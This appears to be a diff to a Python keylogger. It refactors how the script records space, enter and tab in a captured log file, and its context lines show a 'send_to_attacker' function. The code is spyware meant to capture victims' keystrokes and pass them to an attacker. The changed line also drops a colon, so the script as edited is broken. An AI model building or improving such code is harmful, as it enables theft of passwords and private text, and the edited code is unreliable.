@@ -12,6 +12,12 @@ log_file = os.path.join(log_folder, "keylog.txt")
 
 log = ""
 
+special_keys = {
+    keyboard.Key.space: " ",
+    keyboard.Key.enter: "\n",
+    keyboard.Key.tab: "\t",
+}
+
 def send_to_attacker(log_data):
     timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
     full_log = f"{timestamp} {log_data}"
@@ -34,12 +40,8 @@ def on_press(key):
     try:
         log += key.char
     except AttributeError:
-        if key == keyboard.Key.space:
-            log += " "
-        elif key == keyboard.Key.enter:
-            log += "\n"
-        elif key == keyboard.Key.tab:
-            log += "\t"
+        if char := special_keys.get(key)
+            log += char
         else:
             pass
 
